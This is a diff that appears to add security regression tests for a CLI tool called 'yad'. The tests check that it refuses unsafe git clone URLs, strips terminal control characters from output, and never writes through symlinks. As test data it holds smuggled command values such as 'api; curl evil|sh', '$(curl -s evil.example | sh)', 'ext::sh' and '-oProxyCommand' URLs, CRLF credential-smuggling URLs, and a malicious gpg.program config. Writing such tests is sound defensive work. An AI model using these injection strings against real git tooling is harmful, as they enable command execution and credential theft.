+    const r = e79Yad(T, product, ['repo', 'refresh']);
+    assert.doesNotMatch(r.stdout + r.stderr, /yad failed|ERR_INVALID_ARG_TYPE/);
+    assert.match(r.stdout, /not a path under \.sdlc\/code-context/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 3: a registered git_url must be a network address — a local path could name a repo the Product commits', async () => {
+  const { cloneSource } = await import('./workspace.mjs');
+  const cloneUrlOk = (...a) => cloneSource(...a) !== null;
+  const T = e79Tmp();
+  try {
+    const { ws, product } = e80Workspace(T);
+    for (const good of ['https://github.com/o/r.git', 'http://h.example/r', 'ssh://git@h.example/r.git', 'git://h.example/r', 'git@github.com:o/r.git', 'gitlab.example.com:o/r.git']) {
+      assert.ok(cloneUrlOk(product, good, {}), good);
+    }
+    const outside = path.join(T, 'remotes', 'r.git');
+    fs.mkdirSync(outside, { recursive: true });   // a local source must exist (E81 review 5)
+    for (const bad of ['evil', './evil', '../product/evil', path.join(product, 'evil'), `file://${path.join(product, 'evil')}`, 'ext::sh -c touch% /tmp/x', 'fd::17', outside, `file://${outside}`, 'C:\\r.git']) {
+      assert.ok(!cloneUrlOk(product, bad, {}), bad);
+    }
+    // With the door, an absolute local path outside the workspace only.
+    const door = { YAD_ALLOW_LOCAL_REMOTES: '1' };
+    assert.ok(cloneUrlOk(product, outside, door));
+    assert.ok(cloneUrlOk(product, `file://${outside}`, door));
+    for (const bad of ['evil', '../product/evil', path.join(product, 'evil'), path.join(ws, 'other.git'), `file://${path.join(product, 'evil')}`]) {
+      assert.ok(!cloneUrlOk(product, bad, door), `${bad} (door open)`);
+    }
+
+    // End to end: a repo the Product commits, registered by a local path, is never cloned — door or not.
+    e79Git(T, product, 'init', '-q', '--bare', 'evil');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [
+      { name: 'api', path: '../api', git_url: path.join(product, 'evil') },
+      { name: 'rel', path: '../rel', git_url: 'product/evil' },
+    ] }));
+    for (const extra of [{ YAD_ALLOW_LOCAL_REMOTES: '' }, {}]) {
+      const r = e79Yad(T, ws, ['repo', 'clone', '--dir', product, '--json'], extra);
+      assert.equal(r.status, 1, r.stdout + r.stderr);
+      const a = JSON.parse(r.stdout);
+      assert.deepEqual(a.cloned, []);
+      assert.ok(a.failed.every((f) => /not a network address/.test(f.reason)), JSON.stringify(a.failed));
+    }
+    assert.ok(!fs.existsSync(path.join(ws, 'api')) && !fs.existsSync(path.join(ws, 'rel')));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json'], { YAD_ALLOW_LOCAL_REMOTES: '' }).stdout);
+    assert.doesNotMatch(doc.checks.find((c) => c.id === 'repo:api').hint, /run `yad repo clone`/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 3: sync leaves a monorepo subfolder to the checkout it belongs to', () => {
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    e79Git(T, product, 'init', '-q', '-b', 'main');
+    fs.mkdirSync(path.join(product, 'apps', 'web'), { recursive: true });
+    fs.writeFileSync(path.join(product, 'apps', 'web', 'x'), 'x');
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'x');
+    e79Git(T, product, 'checkout', '-q', '-b', 'feature');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'web', path: 'apps/web', default_branch: 'main' }] }));
+    const r = e79Yad(T, product, ['repo', 'sync']);
+    assert.match(r.stdout, /web .*a folder inside the checkout .*skipped/);
+    assert.equal(e79Git(T, product, 'rev-parse', '--abbrev-ref', 'HEAD'), 'feature', 'the Product\'s branch is untouched');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 4: the file transport is only for a URL that passed as a local path — a local folder named like a host is never cloned', async () => {
+  const { cloneSource } = await import('./workspace.mjs');
+  const cloneUrlKind = (...a) => cloneSource(...a)?.kind ?? null;
+  const T = e79Tmp();
+  try {
+    const { ws, product } = e80Workspace(T);
+    const door = { YAD_ALLOW_LOCAL_REMOTES: '1' };
+    assert.equal(cloneUrlKind(product, 'evil.com:x', door), 'network', 'judged as a host, so cloned with the file transport off');
+    assert.equal(cloneUrlKind(product, 'gh-work:org/r.git', {}), 'network', 'an ssh alias with no dot');
+    for (const bad of ['a.b::x', 'codecommit::us-east-1://r', 'x::y/z']) assert.equal(cloneUrlKind(product, bad, door), null, bad);
+    assert.equal(cloneUrlKind(product, `file://${ws.replace(/ws$/, '%77s')}/product/evil`, door), null, 'percent-encoded: refused');
+    if (process.platform === 'darwin' || process.platform === 'win32') {
+      assert.equal(cloneUrlKind(product, path.join(product, 'evil').toUpperCase(), door), null, 'another letter case is the same folder');
+    }
+    // End to end, door open: a bare repo the Product commits under a host-like name, reached relative to
+    // where yad runs. git would read it as a local folder; the file transport is off for it.
+    e79Git(T, product, 'init', '-q', '--bare', 'evil.com:x');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api', path: '../api', git_url: 'evil.com:x' }] }));
+    const r = e79Yad(T, product, ['repo', 'clone', '--json']);
+    assert.equal(r.status, 1, r.stdout + r.stderr);
+    assert.match(JSON.parse(r.stdout).failed[0].reason, /transport 'file' not allowed — a registered repo is cloned over the network only/);
+    assert.ok(!fs.existsSync(path.join(ws, 'api', '.git')), 'nothing cloned');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 5: the clone sets its own GIT_ALLOW_PROTOCOL, and a local source must exist and is judged as the disk resolves it', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { cloneSource } = await import('./workspace.mjs');
+  const T = e79Tmp();
+  try {
+    const { ws, product } = e80Workspace(T);
+    // A value the person's environment carries cannot turn the file transport back on.
+    e79Git(T, product, 'init', '-q', '--bare', 'evil.com:x');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api', path: '../api', git_url: 'evil.com:x' }] }));
+    const r = e79Yad(T, product, ['repo', 'clone', '--json'], { GIT_ALLOW_PROTOCOL: 'file:https' });
+    assert.equal(r.status, 1, r.stdout + r.stderr);
+    assert.match(JSON.parse(r.stdout).failed[0].reason, /transport 'file' not allowed/);
+    assert.ok(!fs.existsSync(path.join(ws, 'api', '.git')));
+    // The workspace reached through a link (as macOS /var is): a path that does not exist, whose
+    // `.git` twin the Product commits, is refused — not judged as typed.
+    e79Git(T, product, 'init', '-q', '--bare', 'evil.git');
+    fs.symlinkSync(T, path.join(T, 'alias'));
+    const door = { YAD_ALLOW_LOCAL_REMOTES: '1' };
+    const viaLink = path.join(T, 'alias', 'ws', 'product');
+    for (const u of [path.join(viaLink, 'evil'), path.join(viaLink, 'evil.git'), `file://${path.join(viaLink, 'evil.git')}`, path.join(T, 'nowhere.git')]) {
+      assert.equal(cloneSource(product, u, door), null, u);
+    }
+    // An existing folder outside: git is handed the folder as resolved, not the text.
+    fs.mkdirSync(path.join(T, 'remotes', 'r.git'), { recursive: true });
+    assert.deepEqual(cloneSource(product, `file://${path.join(T, 'alias', 'remotes', 'r.git')}`, door), { kind: 'local', url: path.join(T, 'remotes', 'r.git') });
+    // Doctor on a path that is not text: named, never a crash.
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'n', path: 5 }] }));
+    const doc = e79Yad(T, product, ['doctor', '--json']);
+    assert.doesNotMatch(doc.stdout + doc.stderr, /must be of type string|yad failed/);
+    assert.equal(JSON.parse(doc.stdout).checks.find((c) => c.id === 'repo:n').status, 'fail');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 6: the host and user of every URL form keep to safe characters — ssh may put them in a shell command', async () => {
+  const { cloneSource } = await import('./workspace.mjs');
+  const kind = (u) => cloneSource(os.tmpdir(), u, {})?.kind ?? null;
+  for (const good of ['https://me%40corp.com@bitbucket.org/w/r.git', 'https://oauth2:glpat-x_y@gitlab.com/o/r.git', 'https://github.com/o/r.git', 'https://x-access-token:ghp_abc123@github.com/o/r.git', 'ssh://git@ghe.corp.example:2222/o/r.git', 'ssh://[::1]/r', 'git://h.example/r', 'git+ssh://git@h/r', 'https://h.example', 'git@github.com:o/r.git', 'gh-work:o/r.git']) {
+    assert.equal(kind(good), 'network', good);
+  }
+  for (const bad of ['ssh://a;touch${IFS}x;/r', 'ssh://git@a`id`/r', 'git://a$(touch${IFS}x)/r', 'ssh://a b/r', 'https://h.example\n/r', 'ssh://u;id@h/r', 'git@a$(id):r', 'git@[::1]:r', 'ssh://u:%24%28id%29@h/r', 'git+ssh://u:%3Bid@h/r', 'ssh://u%3Bid@h/r', 'git://u:a%20b@h/r',
+    // E81 review 8: a control character, typed or encoded, reaches the credential helper or the prompt.
+    'https://u%0dhost%3dgithub.com%0dprotocol%3dhttps@evil.example/x', 'https://u:p%0D@h/r', 'https://h/r%0dx', 'http://h/x%0ahost%3dgithub.com',
+    'https://u%1b%5b2J@h/x', 'https://h/a\rb',
+    // E81 review 9: C1, separators and bidi controls — raw or as UTF-8 escapes.
+    'https://u%c2%9b2J@h/r', 'https://u%C2%85@h/r', 'https://u%e2%80%ae@h/r', 'https://h/a%E2%80%A8b', 'https://h/a%e2%81%a6b', 'https://h/a\u202eb', 'https://h/a\u2028b', 'https://h/a\u061cb', 'https://h/a%d8%9cb', 'https://h/a%7fb', 'https://h/a%00b', 'https://h/a\u009bb',
+    // …and a host or user that starts with `-`.
+    'ssh://-oProxyCommand=x/r', 'ssh://-u@h/r', '-h:o/r', '-u@h:o/r']) {
+    assert.equal(kind(bad), null, bad);
+  }
+});
+
+test('E81 review 9: doctor never puts a registry name that is not one plain word into a command to copy', () => {
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api; curl evil|sh', path: '../backend' }, { name: 'web', path: '../backend' }, { name: '--push', path: '../backend' }] }));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    assert.equal(doc.checks.find((c) => c.id === 'repo:api; curl evil|sh').hint, 'run `yad repo refresh <name>` once it has code');
+    assert.equal(doc.checks.find((c) => c.id === 'repo:web').hint, 'run `yad repo refresh web` once it has code');
+    assert.equal(doc.checks.find((c) => c.id === 'repo:--push').hint, 'run `yad repo refresh <name>` once it has code', 'never an option in a command to copy');
+    assert.ok(backend);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 11: no doctor command to copy carries a registry name or branch that is not one plain word', () => {
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    // A wired code repo (so the product-link check reads it), with a CODEOWNERS line that matches nothing.
+    fs.mkdirSync(path.join(backend, 'checks'), { recursive: true });
+    fs.writeFileSync(path.join(backend, 'checks', 'contract-check.sh'), '#!/bin/sh\n');
+    fs.writeFileSync(path.join(backend, 'CODEOWNERS'), 'nothing-here/ @someone\n');
+    e79Git(T, backend, 'add', '-A');
+    e79Git(T, backend, 'commit', '-qm', 'wired');
+    const evil = 'api; curl evil.example|sh #';
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: evil, path: '../backend', default_branch: 'x; curl evil.example|sh #' }] }));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    const text = (id) => { const c = doc.checks.find((x) => x.id === id); assert.ok(c, id); return `${c.message}\n${c.hint || ''}`; };
+    const risk = text(`risk-map:${evil}`);
+    assert.match(risk, /`yad risk-map draft <name>`/);
+    const owners = text(`codeowners:${evil}`);
+    assert.match(owners, /`yad codeowners check <name>`/);
+    const link = text('repos:product-link-missing');
+    assert.match(link, /git checkout <default-branch> && git pull origin <default-branch>/);
+    for (const t of [risk, owners, link]) {
+      for (const cmd of t.match(/`[^`]*`/g) || []) assert.doesNotMatch(cmd, /curl/, `a command to copy: ${cmd}`);
+    }
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 12: the protection line, the CI tags check and refresh print registry text cleaned for the terminal', async () => {
+  const { readProtection, protectionLine } = await import('./protection.mjs');
+  const esc = 'ma\u001b[31min\u009b\u202e';
+  const hasRaw = (t) => ['\u001b', '\u009b', '\u202e'].some((ch) => t.includes(ch));
+  const r = readProtection({ platform: 'github', gitUrl: 'https://github.com/org/repo', branch: esc }, { env: { YAD_PLATFORM_READ: '0' } });
+  const line = protectionLine(r, { name: 'api' });
+  assert.ok(!hasRaw(`${line.message}\n${line.hint || ''}`), 'the branch is cleaned');
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    // A GitLab repo whose CI fragment runs a docker job with no tags: its name is printed.
+    fs.mkdirSync(path.join(backend, '.gitlab', 'ci'), { recursive: true });
+    fs.writeFileSync(path.join(backend, '.gitlab', 'ci', 'yad-checks.yml'), 'job:\n  image: node:22\n  script: [x]\n');
+    const name = 'b\u001b[2Jx';
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name, path: '../backend', platform: 'gitlab', default_branch: esc }] }));
+    const doc = e79Yad(T, product, ['doctor']);
+    assert.ok(!hasRaw(doc.stdout + doc.stderr), 'doctor prints no raw control character');
+    // refresh with no npx on PATH: the skip line names the repo, cleaned.
+    const ref = e79Yad(T, product, ['repo', 'refresh'], { PATH: '/usr/bin:/bin' });
+    assert.match(ref.stdout + ref.stderr, /b \[2Jx: npx missing/);
+    assert.ok(!hasRaw(ref.stdout + ref.stderr));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 13: a registry host that is not a plain host name is never used or repeated; the last raw prints are cleaned', async () => {
+  const { readProtection, protectionLine } = await import('./protection.mjs');
+  const { pathToFileURL } = await import('node:url');
+  const hasRaw = (t) => ['\u001b', '\u009b', '\u202e'].some((ch) => t.includes(ch));
+  const calls = [];
+  const runner = (cmd, args) => { calls.push([cmd, ...args]); return { ok: cmd === 'which' || cmd === 'where', stdout: '' }; };
+  for (const gitUrl of ['$(curl -s evil.example | sh):o/r', 'https://$(id)/o/r', 'git@a;touch${IFS}x:o/r', '\u001b[2Jhost:o/r']) {
+    calls.length = 0;
+    const r = readProtection({ platform: 'github', gitUrl, branch: 'main' }, { runner, env: {} });
+    assert.equal(r.kind, 'no-url', gitUrl);
+    const line = protectionLine(r, { name: 'api' });
+    const text = `${line.message}\n${line.hint || ''}`;
+    assert.doesNotMatch(text, /curl|\$\(|touch/, gitUrl);
+    assert.ok(!hasRaw(text), gitUrl);
+    assert.deepEqual(calls, [], `${gitUrl}: no CLI asked`);
+  }
+  assert.equal(readProtection({ platform: 'github', gitUrl: 'https://github.com/o/r', branch: 'main' }, { runner, env: {} }).kind, 'no-login', 'a plain host is still asked about');
+  const odd = readProtection({ platform: '\u009b31m\u202e', gitUrl: 'https://github.com/o/r' }, { runner, env: {} });
+  assert.ok(!hasRaw(protectionLine(odd, { name: 'api' }).message), 'an unknown platform is cleaned');
+
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    // A folder in the registered repo's own tree, named with an escape, that the risk map does not cover.
+    fs.mkdirSync(path.join(backend, '.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(backend, '.sdlc', 'risk-map'), '# yad-risk-map v1\n');
+    fs.mkdirSync(path.join(backend, 'ev\u001b[31mil'));
+    fs.writeFileSync(path.join(backend, 'ev\u001b[31mil', 'f.js'), 'x');
+    e79Git(T, backend, 'add', '-A');
+    e79Git(T, backend, 'commit', '-qm', 'tree');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'backend', path: '../backend', platform: '\u009b31m\u202e' }] }));
+    // The Product's own default branch, with an escape, read on another branch.
+    fs.writeFileSync(path.join(product, '.sdlc', 'hub.json'), JSON.stringify({ platform: 'github', default_branch: '\u001b[31mRED' }));
+    e79Git(T, product, 'init', '-q', '-b', 'feat');
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'p');
+    const doc = e79Yad(T, product, ['doctor']);
+    assert.ok(!hasRaw(doc.stdout + doc.stderr), 'doctor prints no raw control character');
+    // guardDefaultBranch (reached by `yad repo refresh --push`) prints the hub's branch cleaned.
+    const g = spawnSync(process.execPath, ['--input-type=module', '-e',
+      `const { guardDefaultBranch } = await import(${JSON.stringify(pathToFileURL(path.join(ROOT, 'cli', 'hubcommit.mjs')).href)}); guardDefaultBranch('feat', '\\u001b[31mRED');`], { encoding: 'utf8', env: e79Env(T) });
+    assert.match(g.stdout + g.stderr, /not the default branch ' \[31mRED'/);
+    assert.ok(!hasRaw(g.stdout + g.stderr));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 14: doctor builds no login command from a hub host that is not a plain host name; hub.json text is cleaned', () => {
+  const hasRaw = (t) => ['\u001b', '\u009b', '\u202e'].some((ch) => t.includes(ch));
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    // A fake gh that is always "not logged in".
+    const bin = path.join(T, 'bin');
+    fs.mkdirSync(bin);
+    fs.writeFileSync(path.join(bin, 'gh'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
+    const env = { PATH: `${bin}:${process.env.PATH}` };
+    const hubFile = path.join(product, '.sdlc', 'hub.json');
+    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
+      roster: [{ name: '\u001b[2JX', login: 'a' }, { name: '\u001b[2JX', login: 'b' }] }));
+    const doc = e79Yad(T, product, ['doctor'], env);
+    const out = doc.stdout + doc.stderr;
+    assert.doesNotMatch(out, /curl/, 'the host is never repeated');
+    assert.match(out, /auth check skipped — the hub's git remote URL names a host that is not a plain host name/);
+    assert.ok(!hasRaw(out), 'no raw control character');
+    fs.writeFileSync(hubFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
+    assert.ok(!hasRaw(e79Yad(T, product, ['doctor'], env).stdout));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 15: the solo people count runs no git in a folder the Product shaped as a repo, and says it could not count it', { skip: process.platform === 'win32' && 'a shell script as gpg.program' }, () => {
+  const T = e79Tmp();
+  const marker = path.join(fs.realpathSync(os.tmpdir()), `yad-e81-r15-${process.pid}`);
+  fs.rmSync(marker, { force: true });
+  try {
+    const { product } = e80Workspace(T);
+    // A repo holding one commit with a signature header, then its git folder copied into the Product as a
+    // plain folder, with a config that runs a program whenever git log checks a signature.
+    const src = path.join(T, 'src');
+    fs.mkdirSync(src);
+    e79Git(T, src, 'init', '-q', '-b', 'main');
+    fs.writeFileSync(path.join(src, 'f'), 'x');
+    e79Git(T, src, 'add', '-A');
+    e79Git(T, src, 'commit', '-qm', 'x');
+    const tree = e79Git(T, src, 'rev-parse', 'HEAD^{tree}');
+    const now = Math.floor(Date.now() / 1000);
+    const body = `tree ${tree}\nauthor A <a@example.com> ${now} +0000\ncommitter A <a@example.com> ${now} +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n \n x\n -----END PGP SIGNATURE-----\n\nsigned\n`;
+    const sha = execFileSync('git', ['hash-object', '-t', 'commit', '-w', '--stdin'], { cwd: src, input: body, env: e79Env(T) }).toString().trim();
+    e79Git(T, src, 'update-ref', 'refs/heads/main', sha);
+    const evil = path.join(product, 'evil');
+    fs.cpSync(path.join(src, '.git'), evil, { recursive: true });
+    const prog = path.join(T, 'gpg.sh');
+    fs.writeFileSync(prog, `#!/bin/sh\ntouch '${marker}'\nexit 1\n`, { mode: 0o755 });
+    fs.appendFileSync(path.join(evil, 'config'), `[core]\n\tbare = true\n[log]\n\tshowSignature = true\n[gpg]\n\tprogram = ${prog}\n`);
+    fs.writeFileSync(path.join(product, '.sdlc', 'hub.json'), JSON.stringify({ platform: null, solo: true }));
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'evil\u001b[31m', path: 'evil' }] }));
+    e79Git(T, product, 'init', '-q', '-b', 'main');
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'p');
+    const doc = e79Yad(T, product, ['doctor']);
+    assert.ok(!fs.existsSync(marker), 'no program the Product chose ran');
+    assert.match(doc.stdout + doc.stderr, /repo 'evil \[31m': .*its history cannot be counted here/);
+    assert.ok(!(doc.stdout + doc.stderr).includes('\u001b[31m'), 'the name is cleaned');
+    // The other callers of the count read the same judged list.
+    for (const args of [['next'], ['mode']]) e79Yad(T, product, args);
+    assert.ok(!fs.existsSync(marker), 'nor through yad next or yad mode');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); fs.rmSync(marker, { force: true }); }
+});
+
+test('E81 review 16: refresh never writes through a .gitignore the Product commits as a link', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { ensurePackIgnored } = await import('./setup.mjs');
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    const outside = path.join(T, 'outside.txt');
+    fs.writeFileSync(outside, 'mine\n');
+    fs.symlinkSync(outside, path.join(product, '.gitignore'));
+    assert.equal(ensurePackIgnored(product), false);
+    assert.equal(fs.readFileSync(outside, 'utf8'), 'mine\n', 'the file it points at is untouched');
+    assert.ok(fs.lstatSync(path.join(product, '.gitignore')).isSymbolicLink());
+    fs.rmSync(path.join(product, '.gitignore'));
+    fs.mkdirSync(path.join(T, 'dir'));
+    fs.symlinkSync(path.join(T, 'dir'), path.join(product, '.gitignore'));
+    assert.equal(ensurePackIgnored(product), false, 'a link to a folder: no crash');
+    fs.rmSync(path.join(product, '.gitignore'));
+    assert.equal(ensurePackIgnored(product), true, 'no file: written as before');
+    assert.match(fs.readFileSync(path.join(product, '.gitignore'), 'utf8'), /pack\.md/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 17: writeJSON never writes through a link at its temp name, and refresh never writes through a linked .sdlc', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { writeJSON } = await import('./lib.mjs');
+  const T = e79Tmp();
+  try {
+    // The old temp name was `<file>.<pid>.tmp`: a link there, dangling, must never be followed.
+    const f = path.join(T, 'repos.json');
+    const target = path.join(T, 'zshenv');
+    fs.symlinkSync(target, `${f}.${process.pid}.tmp`);
+    writeJSON(f, { repos: [] });
+    assert.ok(!fs.existsSync(target), 'nothing written where the link points');
+    assert.deepEqual(JSON.parse(fs.readFileSync(f, 'utf8')), { repos: [] });
+    assert.ok(fs.lstatSync(`${f}.${process.pid}.tmp`).isSymbolicLink(), 'the link is left alone');
+    // A `.sdlc` the Product commits as a link: refresh does not write the registry through it.
+    const { product } = e80Workspace(T);
+    const elsewhere = path.join(T, 'elsewhere');
+    fs.renameSync(path.join(product, '.sdlc'), elsewhere);
+    fs.symlinkSync(elsewhere, path.join(product, '.sdlc'));
+    const before = fs.readFileSync(path.join(elsewhere, 'repos.json'), 'utf8');
+    const r = e79Yad(T, product, ['repo', 'refresh']);
+    assert.equal(r.status, 1, r.stdout + r.stderr);
+    assert.match(r.stdout + r.stderr, /\.sdlc in the Product is a link/);
+    const pushed = e79Yad(T, product, ['repo', 'refresh', '--push', '--json']);
+    assert.equal(pushed.status, 1);
+    assert.equal(JSON.parse(pushed.stdout).published, null, 'nothing is published after the refusal');
+    assert.equal(fs.readFileSync(path.join(elsewhere, 'repos.json'), 'utf8'), before, 'the folder it names is untouched');
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
